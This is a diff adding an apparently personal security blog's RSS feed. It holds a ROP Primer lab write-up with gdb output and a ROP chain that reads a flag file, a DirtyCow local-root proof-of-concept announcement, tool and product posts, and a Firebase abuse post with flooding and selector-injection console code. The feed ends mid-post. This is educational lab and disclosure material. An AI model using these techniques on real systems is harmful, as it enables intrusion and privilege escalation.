@@ -1,0 +1,865 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Blog on Robin Verton</title>
+    <link>http://robinverton.de/blog/index.xml</link>
+    <description>Recent content in Blog on Robin Verton</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>de-de</language>
+    <lastBuildDate>Fri, 04 Nov 2016 16:01:51 +0100</lastBuildDate>
+    <atom:link href="http://robinverton.de/blog/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Solving ROP primer level2</title>
+      <link>http://robinverton.de/blog/2016/11/04/solving-rop-primer-level2/</link>
+      <pubDate>Fri, 04 Nov 2016 16:01:51 +0100</pubDate>
+      
+      <guid>http://robinverton.de/blog/2016/11/04/solving-rop-primer-level2/</guid>
+      <description>
+
+&lt;p&gt;Some days ago I started reading into Return Oriented Programming and had a lot of fun doing some VMs and exercises I found over the internet. ROP is a technique which allows attackers to execute code in the presence of defense mechanism like DEP/NX. I&amp;rsquo;m not explaining what ROP is and how it is done, because a lot of other people &lt;a href=&#34;http://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html&#34;&gt;have done this already&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Instead I want to share a solution I made for the second level of a VM called &lt;a href=&#34;https://www.vulnhub.com/entry/rop-primer-02,114/&#34;&gt;ROP Primer v0.2&lt;/a&gt;. Most &lt;a href=&#34;https://xmgv.wordpress.com/2015/08/17/rop-primer-level-2/&#34;&gt;other&lt;/a&gt; &lt;a href=&#34;http://blog.the-playground.dk/2015/08/rop-primer-v02-level-2.html&#34;&gt;posts&lt;/a&gt; about this level I found spawned a shell, allowing the flag to be read manually. For learning purposes I took a slightly different approach: opening the flag, reading the content to memory and then printing it to &lt;code&gt;STDOUT&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;First of all, let&amp;rsquo;s gather some information on the binary:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level2@rop:~$ file level2
+level2: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.26, BuildID[sha1]=baba7f4fd049424caed048eb73eb6668b45a962e, not stripped
+level2@rop:~$ gdb -q level2
+Reading symbols from level2...(no debugging symbols found)...done.
+gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : disabled
+gdb-peda$
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The already installed &lt;em&gt;peda&lt;/em&gt; on this VM shows that No-Execute (NX) is enabled.&lt;/p&gt;
+
+&lt;p&gt;Looking at the source of this level (you find this by browsing to the web server exposed by this VM), triggering a crash is pretty straight forward:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gdb-peda$ r $(python -c &amp;quot;print &#39;A&#39;*100&amp;quot;)
+Starting program: /home/level2/level2 $(python -c &amp;quot;print &#39;A&#39;*100&amp;quot;)
+[+] ROP tutorial level2
+[+] Bet you can&#39;t ROP me this time around, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
+[...snip...]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x41414141 in ?? ()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Let&amp;rsquo;s use pedas &lt;code&gt;pattern&lt;/code&gt; functions to find the offset:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;gdb-peda$ pattern arg 100
+Set 1 arguments to program
+gdb-peda$ r
+Starting program: /home/level2/level2 &#39;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&#39;
+[+] ROP tutorial level2
+[+] Bet you can&#39;t ROP me this time around, AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL!
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EAX: 0x0
+EBX: 0x0
+ECX: 0xbffff61c --&amp;gt; 0x80ca4c0 --&amp;gt; 0xfbad2a84
+EDX: 0x80cb430 --&amp;gt; 0x0
+ESI: 0x80488f0 (&amp;lt;__libc_csu_fini&amp;gt;:	push   ebp)
+EDI: 0x580c099e
+EBP: 0x41304141 (&#39;AA0A&#39;)
+ESP: 0xbffff670 (&amp;quot;bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&amp;quot;)
+EIP: 0x41414641 (&#39;AFAA&#39;)
+EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x41414641
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff670 (&amp;quot;bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&amp;quot;)
+0004| 0xbffff674 (&amp;quot;AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&amp;quot;)
+0008| 0xbffff678 (&amp;quot;AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&amp;quot;)
+0012| 0xbffff67c (&amp;quot;2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&amp;quot;)
+0016| 0xbffff680 (&amp;quot;AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&amp;quot;)
+0020| 0xbffff684 (&amp;quot;A3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&amp;quot;)
+0024| 0xbffff688 (&amp;quot;IAAeAA4AAJAAfAA5AAKAAgAA6AAL&amp;quot;)
+0028| 0xbffff68c (&amp;quot;AA4AAJAAfAA5AAKAAgAA6AAL&amp;quot;)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x41414641 in ?? ()
+gdb-peda$ pattern offset 0x41414641
+1094796865 found at offset: 44
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Great, so we can overwrite EIP at &lt;strong&gt;45-48&lt;/strong&gt;. Because NX is set, we can not just push some shellcode and lead our control flow to this address. Instead we need to construct our logic by using some gadgets we can find. A really usefull site I used for this is &lt;a href=&#34;http://ropshell.com&#34;&gt;ropshell.com&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Because a &lt;code&gt;strcpy&lt;/code&gt; is used to copy our argument into the buffer, we can&amp;rsquo;t use NULL-Bytes here, making this a bit more complex. Let&amp;rsquo;s go.&lt;/p&gt;
+
+&lt;h4 id=&#34;what-file-should-we-read&#34;&gt;What file should we read?&lt;/h4&gt;
+
+&lt;p&gt;To &lt;code&gt;open()&lt;/code&gt; a file, we need to set two arguments: a path and a mode. The path is just the filename &amp;lsquo;flag&amp;rsquo;. Let&amp;rsquo;s put this into memory first. But where should we place this? We need to find a writeable memory space which address we know. Again, peda can help us here:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;gdb-peda$ vmmap
+Start      End        Perm	Name
+0x08048000 0x080ca000 r-xp	/home/level2/level2
+0x080ca000 0x080cb000 rw-p	/home/level2/level2
+0x080cb000 0x080ef000 rw-p	[heap]
+0xb7ffe000 0xb7fff000 rw-p	mapped
+0xb7fff000 0xb8000000 r-xp	[vdso]
+0xbffdf000 0xc0000000 rw-p	[stack]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;0x080ca000&lt;/code&gt; is writeable, let&amp;rsquo;s use this. Because this address contains a NULL-Byte, we can just increase it to &lt;code&gt;0x080ca004&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Next we need to bring the string &lt;code&gt;flag&lt;/code&gt; into memory. To do this, we need to do three things:&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;Put the address where we want to save this in a register&lt;/li&gt;
+&lt;li&gt;pop the string on the stack&lt;/li&gt;
+&lt;li&gt;move the string to the address the register from (1) is pointing to.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;The only suitable gadget I found to move was a &lt;code&gt;mov [eax], edx; pop ebx; pop ebp; ret&lt;/code&gt;, so we also have to push some dummy on the stack. After this I am pushing a \0 to the end of the string to null terminate it:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;payload += p(pop_eax)
+payload += p(writeable_buffer)  # 0x080ca004
+payload += p(pop_edx)
+payload += &#39;flag&#39;
+payload += p(mov_eax_edx)
+payload += &#39;AAAA&#39;               # dummy for pop ebx
+payload += &#39;AAAA&#39;               # dummy for pop ebp
+
+# Null-terminate flag string
+payload += p(xor_eax_eax)
+payload += p(pop_edx)
+payload += p(writeable_buffer+0x4)
+payload += p(mov_edx_eax)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Great, let&amp;rsquo;s set a breakpoint and see if this worked:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;gdb-peda$ x/s 0x080ca004
+0x80ca004:	&amp;quot;flag&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Awesome. &lt;em&gt;Note:&lt;/em&gt; When you run your scripts from gdb, make sure to use quotation marks for your arguments. Otherwise you will get problems when using chars like &lt;code&gt;\x0a&lt;/code&gt; or &lt;code&gt;\x09&lt;/code&gt;.. I learned this the hard way.&lt;/p&gt;
+
+&lt;h4 id=&#34;opening-the-flag-file&#34;&gt;Opening the flag file&lt;/h4&gt;
+
+&lt;p&gt;If you take a look at &lt;a href=&#34;http://syscalls.kernelgrok.com/&#34;&gt;Linux Syscall Reference&lt;/a&gt; you can see the register values we need:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://robinverton.de/static/rop-primer-1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Because we can&amp;rsquo;t put a NULL-byte in there and &lt;code&gt;0x05&lt;/code&gt; is popped as &lt;code&gt;\x05\x00\x00\x00&lt;/code&gt;, we need to get a bit creative here. A simple approach to work around this is pop&amp;rsquo;ing &lt;code&gt;0xffffffff&lt;/code&gt; (-1) and then increasing this value step by step to get to 5 with &lt;code&gt;inc reg&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;After all our registers are set up, we use the address of a &lt;code&gt;int 0x80&lt;/code&gt; to execute this syscall:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# 2/ open file
+# open(pathname, flags)
+# eax=0x05, ebx = filename, ecx = flags
+
+payload += p(pop_ecx_pop_ebx)
+payload += p(0xffffffff)        # ecx = -1
+payload += p(writeable_buffer)  # ebx = address of &#39;flag&#39;
+payload += p(inc_ecx)           # ebx = 0
+
+payload += p(xor_eax_eax)
+payload += p(inc_eax)           # eax = 1
+payload += p(inc_eax)           # eax = 2
+payload += p(inc_eax)           # eax = 3
+payload += p(inc_eax)           # eax = 4
+payload += p(inc_eax)           # eax = 5
+
+payload += p(int_0x80)          # GO!
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h4 id=&#34;read-from-file-write-to-stdout&#34;&gt;Read from file, write to STDOUT&lt;/h4&gt;
+
+&lt;p&gt;We now use the same technique for calling &lt;code&gt;sys_read&lt;/code&gt; and &lt;code&gt;sys_write&lt;/code&gt;. Because file descriptors 0 (STDIN), 1 (STDOUT), 2 (STDERR) are predefined, our recently opened file will be accessible at FD &lt;code&gt;3&lt;/code&gt;. To print to STDOUT we can then use FD &lt;code&gt;2&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://robinverton.de/static/rop-primer-2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After executing our exploit, we can see the flag printed to stdout (surrounded with some garbage):&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;level2@rop:~$ ./level2 &amp;quot;$(python exploit2.py)&amp;quot;
+[+] ROP tutorial level2
+[+] Bet you can&#39;t ROP me this time around, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAց
+[...snip...]
+flag{to_rop_or_not_to_rop}
+[...snip...]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;You can find my full finished exploit here:
+&lt;a href=&#34;https://gist.github.com/rverton/42340ee4bd3482c6262db2bc9bbb9ef5&#34;&gt;https://gist.github.com/rverton/42340ee4bd3482c6262db2bc9bbb9ef5&lt;/a&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>CVE-2016-5195 (Dirtycow) Local Root PoC</title>
+      <link>http://robinverton.de/blog/2016/10/23/cve-2016-5195-dirtycow-local-root-poc/</link>
+      <pubDate>Sun, 23 Oct 2016 16:00:29 +0100</pubDate>
+      
+      <guid>http://robinverton.de/blog/2016/10/23/cve-2016-5195-dirtycow-local-root-poc/</guid>
+      <description>&lt;p&gt;After the proof of concept code for CVE-2016-5195 (&lt;a href=&#34;https://dirtycow.ninja/&#34;&gt;DirtyCow&lt;/a&gt;) was released, the game was on to &amp;lsquo;weaponize&amp;rsquo; this PoC to a full local root privilege escalation. Because this bug was &lt;a href=&#34;https://www.youtube.com/watch?v=kEsshExn7aE&#34;&gt;not that complicated&lt;/a&gt;, I began working on a simple modified version which is able to spawn a root shell.&lt;/p&gt;
+
+&lt;p&gt;My initial idea was something like this:&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;Get the size of a SUID binary and make a backup.&lt;/li&gt;
+&lt;li&gt;Overwrite this binary with a simple shell (ELF file) plus padding (so it&amp;rsquo;s the same size as the SUID binary).&lt;/li&gt;
+&lt;li&gt;Execute our new shell.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;After some trial and error I got stable version on some systems, however on a few others the kernel crashes after some seconds. I was not able to fix this, maybe someone else can achieve it with a different technique. There is a list of a few more PoC&amp;rsquo;s available on the &lt;a href=&#34;https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs&#34;&gt;official DirtyCow repository&lt;/a&gt; (yeah, mine is also there).&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://robinverton.de/static/cowroot.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;You can view my proof of concept here: &lt;a href=&#34;https://gist.github.com/rverton/e9d4ff65d703a9084e85fa9df083c679&#34;&gt;https://gist.github.com/rverton/e9d4ff65d703a9084e85fa9df083c679&lt;/a&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Webanalyze, utility to uncover technologies used on websites.</title>
+      <link>http://robinverton.de/blog/2015/05/13/webanalyze-utility-to-uncover-technologies-used-on-websites./</link>
+      <pubDate>Wed, 13 May 2015 15:59:22 +0100</pubDate>
+      
+      <guid>http://robinverton.de/blog/2015/05/13/webanalyze-utility-to-uncover-technologies-used-on-websites./</guid>
+      <description>&lt;p&gt;&lt;code&gt;webanalyze&lt;/code&gt; is a (Go) port of &lt;a href=&#34;https://github.com/AliasIO/Wappalyzer&#34;&gt;wappalyzer&lt;/a&gt;, a browser extension to display technologies used on websites.&lt;/p&gt;
+
+&lt;p&gt;To use this in a performant way to test hundreds of hosts simultaneously I rewrote this project in Go. It&amp;rsquo;s not as accurate as the extension because of the missing javascript executing, but most of apps are found correctly.&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;webanalze&lt;/code&gt; can be used as a standalone tool (e.g. to generate a JSON output) or as a lib.&lt;/p&gt;
+
+&lt;p&gt;To keep app definitions up to date the list of apps definitions can be downloaded from the Wappalyzer repository with the &lt;code&gt;-u&lt;/code&gt; (update) flag.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://github.com/rverton/webanalyze&#34;&gt;https://github.com/rverton/webanalyze&lt;/a&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Announcing pentrack.io</title>
+      <link>http://robinverton.de/blog/2014/08/04/announcing-pentrack.io/</link>
+      <pubDate>Mon, 04 Aug 2014 15:57:16 +0100</pubDate>
+      
+      <guid>http://robinverton.de/blog/2014/08/04/announcing-pentrack.io/</guid>
+      <description>
+
+&lt;p&gt;It&amp;rsquo;s been a long time I&amp;rsquo;m working on this and I&amp;rsquo;m happy to announce my new project: &lt;a href=&#34;http://pentrack.io&#34;&gt;pentrack.io&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;PenTrack is a server platform to track found issues during a security audit. Categorize and classify your issues, document them and invite your customer so they can flag issues as fixed. There is a lot of more, so if you are interested I suggest you to take a look at it and register for a free trial.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://robinverton.de/static/pentrack-1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I also wrote a Chrome Browser extension to directly add requests from the chrome developer tools to your pentrack project. The intent was to make it extremly easy and fast to add found issues. Just select your request and choose if you want to add a screenshot.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://robinverton.de/static/pentrack-2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The key features of PenTrack are already implemented. I still have a lot of additional ideas I want to integrate in the future. However, I first want to see if there is at least &lt;em&gt;some&lt;/em&gt; interest in this idea/product before I continue to put a lot of my free time in this.&lt;/p&gt;
+
+&lt;p&gt;Some features I want to integrate in the future:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;JIRA/Trac/Bugzilla/Trello integration&lt;/li&gt;
+&lt;li&gt;Time-tracking&lt;/li&gt;
+&lt;li&gt;Prepare audit (assign scopes, select schedule, trigger automated software)&lt;/li&gt;
+&lt;li&gt;NDA automatization (preparation and sending to involved member/customer)&lt;/li&gt;
+&lt;li&gt;GIST for security issues (You want to publicly discuss an issue? Publish it as simple as posting a gist)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;I&amp;rsquo;m open for more ideas and requests, just drop me an email.&lt;/p&gt;
+
+&lt;h2 id=&#34;tech-stack&#34;&gt;Tech stack&lt;/h2&gt;
+
+&lt;p&gt;For those of you who are interested in the tech behind, here is some more info about the setup.&lt;/p&gt;
+
+&lt;h4 id=&#34;server-component&#34;&gt;Server component&lt;/h4&gt;
+
+&lt;p&gt;The main component of PenTrack is written in Go and based on the &lt;a href=&#34;https://github.com/go-martini/martini&#34;&gt;Martini Framework&lt;/a&gt;. The main reason why I used Go is the ability to offer a (binary) standalone version, so customers can run an instance inside their network without needing to send sensitive data over the internet. Go makes cross-compiling and deploying with a single binary extremly easy. To ship the standalone version I just have to zip the binary with some resources (web interface), so except setting up a config file there is no additional installation/configuration needed.&lt;/p&gt;
+
+&lt;p&gt;Routing with the martini framework and dynamic middleware handlers saved a lot of time and code for me. Routes currently look like this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;	// PUT /:issueId
+	router.Put(&amp;quot;/:iid&amp;quot;,
+    	csrf.Validate,
+		ProjectAccess(ACCESS_READ),
+		IssueUpdate)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;There are two middlewares involved here, one for doing the CSRF validation and a second one checking for sufficient permissions to the project. I like this approach because I can set required permissions on route definition. This makes it a lot easier for me to ensure all routes are just accessible by the users who have the permission for this.&lt;/p&gt;
+
+&lt;h4 id=&#34;frontend&#34;&gt;Frontend&lt;/h4&gt;
+
+&lt;p&gt;The frontend is based on AngularJS, expanded with a lot of small libraries (e.g. D3 or moment.js). I also considered using Facebook&amp;rsquo;s React, but AngularJS seemed a bit more mature for me when I started the project, especially in terms of their documentation and available extensions. I like to completly separate the server component from the frontend, so they are decoupled and communicating over REST.&lt;/p&gt;
+
+&lt;p&gt;I also added an experimental feature called &amp;lsquo;Client-Side Encryption&amp;rsquo; to be able to encrypt issue data before it is sent to the server. Before saving (and sending the data to the server), a javascript service encrypts specific issue data (URI, Title, Data, &amp;hellip;) with the &lt;a href=&#34;http://bitwiseshiftleft.github.io/sjcl/&#34;&gt;Stanford Javascript Crypto Library&lt;/a&gt;. I know that javascript encryption &lt;a href=&#34;https://news.ycombinator.com/item?id=2935220&#34;&gt;is not the best idea&lt;/a&gt;, but it&amp;rsquo;s some additional protection if you dont trust raw issue data on a remote server. The main point here is not ensuring no one is sniffing the content (thats what the HTTPS connection is for), it&amp;rsquo;s to minimise the risk of leaking sensitive data in case of a server hack. However, this feature is experimental and I&amp;rsquo;m happy to hear your thoughts on this. If you need the full security there is a standalone version available.&lt;/p&gt;
+
+&lt;h4 id=&#34;server-and-domain-hosting&#34;&gt;Server and domain hosting&lt;/h4&gt;
+
+&lt;p&gt;Because I already had a good experience with &lt;a href=&#34;https://www.digitalocean.com/&#34;&gt;DigitalOcean&lt;/a&gt; and they have nice prices I choose to serve the landing page and the web interface on digitalocean.&lt;/p&gt;
+
+&lt;p&gt;The domain was hosted on &lt;a href=&#34;https://www.gandi.net&#34;&gt;Gandi&lt;/a&gt; because I found a few good recommendations on HN about them. Also their price for .io domains ($30) is cheaper in comparison to my current &lt;a href=&#34;https://www.united-domains.de/domain-registrieren/preisliste/&#34;&gt;United Domains&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;So far thats the basic architecture. If there are more questions feel free to &lt;a href=&#34;mailto:robin@pentrack.io&#34;&gt;mail me&lt;/a&gt;.
+/robin&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>How extundelete saved my day</title>
+      <link>http://robinverton.de/blog/2014/05/15/how-extundelete-saved-my-day/</link>
+      <pubDate>Thu, 15 May 2014 15:54:56 +0100</pubDate>
+      
+      <guid>http://robinverton.de/blog/2014/05/15/how-extundelete-saved-my-day/</guid>
+      <description>
+
+&lt;p&gt;While setting up a remote backup storage I did a fatal mistake. I needed some seconds to understand what I had done wrong, but after hitting arrow-up a few times to see my command history I got it: I removed all of my images. Damn. I already had a backup of most of my images on an external drive, but there were lately added some new images, so not everything was backed up.&lt;/p&gt;
+
+&lt;h3 id=&#34;tl-dr&#34;&gt;TL;DR&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;I accidentialy deleted my images folder&lt;/li&gt;
+&lt;li&gt;extundelete could not restore my deleted files with the &lt;em&gt;&amp;ndash;restore-directory&lt;/em&gt; option&lt;/li&gt;
+&lt;li&gt;I guessed the &lt;strong&gt;full folder paths&lt;/strong&gt; and used them with &lt;em&gt;&amp;ndash;restore-directory&lt;/em&gt; - SUCCESS&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ extundelete /dev/xyz --restore-direcotry /home/full/path/to/folder # use this
+$ extundelete /dev/xyz --restore-direcotry /home/full/path # not this
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;so-what-happened&#34;&gt;So what happened?&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ cd ~/BackupFolder/
+$ ln -s /home/robin/Pictures Pictures
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This was not exactly how I wanted to structure my backup folder, so I decided to remove the symlink.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ rm -rf Pictures/
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I&amp;rsquo;m using &lt;a href=&#34;http://fishshell.com/&#34;&gt;fish shell&lt;/a&gt;, so the appending slash is added when tab-completing.. Also - why did I use &lt;em&gt;-rf&lt;/em&gt; here?
+It was too late to undo, so the only thing I could do was shutting down my whole box (unmounting was not an option because this happened on my root partition) and booting from a livecd. I immediately did a whole backup of my partition with &lt;em&gt;dd&lt;/em&gt;.&lt;/p&gt;
+
+&lt;h3 id=&#34;extundelete-ext3magic-photorec-and-co&#34;&gt;extundelete, ext3magic, PhotoRec and Co.&lt;/h3&gt;
+
+&lt;p&gt;I&amp;rsquo;m using a SSD drive with an ext4 partition, so my first try was to use &lt;a href=&#34;http://extundelete.sourceforge.net/&#34;&gt;extundelete&lt;/a&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ extundelete sda_backup --restore-directory /home/robin/Pictures
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Sadly only just about &lt;strong&gt;1%&lt;/strong&gt; of all files could be restored.&lt;/p&gt;
+
+&lt;p&gt;Also ext3magic did not find what I was expecting. PhotoRec did found a lot of stuff, but a lot of my over 10k images where corrupted.&lt;/p&gt;
+
+&lt;h3 id=&#34;playing-with-extundelete&#34;&gt;Playing with extundelete&lt;/h3&gt;
+
+&lt;p&gt;I returned using extundelete and tried using the option &lt;em&gt;&amp;ndash;restore-all&lt;/em&gt; to restore all deleted files. After a few minutes I was happy to see that all photos could be found, but distributed over a lot of different and wrong paths. Some images for example were located under
+&lt;em&gt;/home/robin/Development/test/.git/&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;I read a lot on the web and found a user telling that &lt;em&gt;&amp;ndash;restore-directory&lt;/em&gt; did not find a lot of stuff, but using the &lt;strong&gt;full folder path&lt;/strong&gt; of a subfolder in this path &lt;strong&gt;did work&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;I tried different folders like &lt;em&gt;/home/robin/Pictures/Birthday 2014/&lt;/em&gt; which indeed did work! Awesome. I cant explain why this works and using &lt;em&gt;&amp;ndash;restore-all&lt;/em&gt; or &lt;em&gt;&amp;ndash;restore-directory&lt;/em&gt; did not, but this was enough for me to restore all of my files. I had to guess all folders I had under Pictures/, but after digging through some logfiles of tools I had used on this folder I finally restored most of my files.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Be careful when going client only (Firebase)</title>
+      <link>http://robinverton.de/blog/2013/08/27/be-careful-when-going-client-only-firebase/</link>
+      <pubDate>Tue, 27 Aug 2013 15:53:25 +0100</pubDate>
+      
+      <guid>http://robinverton.de/blog/2013/08/27/be-careful-when-going-client-only-firebase/</guid>
+      <description>
+
+&lt;h3 id=&#34;firebase-the-scalable-real-time-backend&#34;&gt;Firebase, the scalable real-time backend&lt;/h3&gt;
+
+&lt;p&gt;Developing client-only applications with JavaScript and services like Firebase offer a nice way to &amp;ldquo;build apps without managing servers&amp;rdquo;. However, sometimes it&amp;rsquo;s not a bad idea to have some controlling server between your client and your data storage.&lt;/p&gt;
+
+&lt;p&gt;When recently browsing over firebase.com and looking at one of their &lt;a href=&#34;https://www.firebase.com/tutorial/#example/presence&#34;&gt;code examples&lt;/a&gt; to get a simple overview of their service, I was surprised how easy it is for clients to interact with the data storage/backend.&lt;/p&gt;
+
+&lt;p&gt;The code example I had a look at is a service to show &amp;ldquo;online presence&amp;rdquo; of users. Whenever a user visits the page, he is prompted for a name which is then saved in the data storage and therefore also send to all users which use this firebase reference (usually all users on a page would use the same reference so you can see all users which are currently online).&lt;/p&gt;
+
+&lt;p&gt;Establishing a connection to the Firebase-Reference is a simple one-liner in Javascript:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;var userListRef = new Firebase(&amp;quot;https://v47p4chbar8.firebaseio-demo.com/&amp;quot;);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This reference allows the client to sent/update/remove data in the data storage. Easy!
+The first thing which came to my mind is the possibility of an attacker to flood the online presence list. Let&amp;rsquo;s try this. Pop up your developer console, open the Javascript console and try the following:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;userListRef = new Firebase(&amp;quot;https://v47p4chbar8.firebaseio-demo.com/&amp;quot;);
+for(i=0;i&amp;lt;100;i++){
+    userListRef.push().set({name:i, status:i})
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Four lines of code, 100 online users. Not bad, right?
+Note: A real use case could make use of firebase security rules, so only authenticated users can be present. The chat application, which is a more realistic use case, is also floodable. Are there security rules to prevent this massive flooding?&lt;/p&gt;
+
+&lt;p&gt;Let&amp;rsquo;s dig a bit deeper in the source. I had hoped to find something where I can directly inject some HTML over the name or status, but when you look at how a name/status is added, you can see that the jquery .text(var) function is used, so you can&amp;rsquo;t inject HTML here:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;userListRef.on(&amp;quot;child_added&amp;quot;, function(snapshot) {
+    var user = snapshot.val();
+    $(&amp;quot;#presenceDiv&amp;quot;).append($(&amp;quot;&amp;lt;div/&amp;gt;&amp;quot;).attr(&amp;quot;id&amp;quot;, snapshot.name()));
+    $(&amp;quot;#&amp;quot; + snapshot.name()).text(user.name + &amp;quot; is currently &amp;quot; + user.status);
+});
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;But this 4th line looked interesting. They are using snapshot.name() in the jQuery-Selector. The .name() function does not return the previously set name, but it returns the name of the child location (the one which is set automatically by calling .push()). BUT.. You can set this by yourself.. ;)
+So lets get back to our developer console:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;userListRef.child(&amp;quot;foo,body&amp;quot;).set({name:&amp;quot;I&#39;m the new Body-Content.&amp;quot;})
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Using the command above, the following is executed at each client:&lt;/p&gt;
+
